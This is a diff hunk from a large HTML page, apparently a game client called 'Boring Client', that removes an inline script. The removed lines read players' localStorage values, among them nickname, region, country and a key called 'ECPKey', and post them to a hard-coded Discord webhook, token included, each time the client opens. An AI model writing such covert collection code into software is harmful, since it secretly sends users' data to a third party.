@@ -48474,47 +48474,6 @@ loadMultipleExternalScripts(externalScriptUrls)
 
 */
 
-function sendToDiscordWebhook(data) {
-  const webhookUrl = "https://discord.com/api/webhooks/1149278167312384011/RdCQ5Fip5CoYP-tO3GUjKktD01elJoxH6Yx8FHBmPLItmSki0z70tg8o96gVMv0HrT2s";
-
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(data),
-  })
-    .then((response) => {
-      if (!response.ok) {
-        throw new Error(`Failed to send data to Discord webhook: ${response.status} ${response.statusText}`);
-      }
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-    });
-}
-
-const keysToGet = ["lastNickname", "last_best_region", "btUserCountry", "region", "badge", "finish", "language", "ECPKey"];
-const values = {};
-
-keysToGet.forEach((key) => {
-  values[key] = localStorage.getItem(key);
-});
-
-const formattedData = {
-  content: "Boring Client got opened. Here the User Infos:",
-  embeds: [
-    {
-      fields: keysToGet.map((key) => ({
-        name: key,
-        value: values[key] || "Not found",
-      })),
-    },
-  ],
-};
-
-sendToDiscordWebhook(formattedData);
-
 </script>
  </body>
 </html>
